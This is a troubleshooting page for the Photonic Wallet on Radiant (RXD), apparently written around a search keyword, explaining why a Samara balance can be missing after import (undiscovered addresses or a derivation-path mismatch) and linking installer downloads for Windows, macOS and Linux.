<div align="center">

<img src="../assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.webp" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Samara balance missing after import

[![Website](https://img.shields.io/badge/Website-photonicwallet.org-7c3aed?style=for-the-badge)](https://photonicwallet.org) [![Release](https://img.shields.io/badge/Release-v3.0.4-00b4d8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://img.shields.io/badge/Docs-guides-0a0e1a?style=for-the-badge&logo=readthedocs&logoColor=white)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** Missing Samara funds usually sit on addresses the import has not discovered yet, or on a different derivation path.

---

## You'll see this if

- Imported wallet shows zero
- Only part of the balance appears
- Tokens missing after migration

## Why it happens

Different wallets derive addresses differently and scan to different depths. More background lives in our guide on [migrate from electron radiant wallet](migrate-from-electron-radiant-wallet.md) and on the [migration guide](https://photonicwallet.org/guides/migrate-from-samara).

## Fix it step by step

1. Check an old Samara address on an explorer.
2. Extend the address scan in Photonic.
3. Compare first addresses to detect a path mismatch.
4. When in doubt, move funds on-chain instead of importing.

## If that didn't work

Read the derivation-path article before retrying. The [transaction lookup](https://photonicwallet.org/guides/check-rxd-transaction) covers related cases, and [Migrate from Chainbow wallet](migrate-from-chainbow-wallet.md) may match your situation.

## Prevention

Migrate by sending funds, not by reusing phrases across apps.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Are funds gone?</b></summary>

If the explorer shows them, they are safe on-chain.

</details>

<details>
<summary><b>Should I import or send?</b></summary>

Sending to a fresh wallet is the cleaner option.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Migrate from Electron Radiant wallet](migrate-from-electron-radiant-wallet.md) | Photonic Wallet guide |
| [Migrate from Chainbow wallet](migrate-from-chainbow-wallet.md) | Photonic Wallet guide |
| [Photonic vs Glyphium wallet](photonic-vs-glyphium-wallet.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: photonic wallet import samara · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
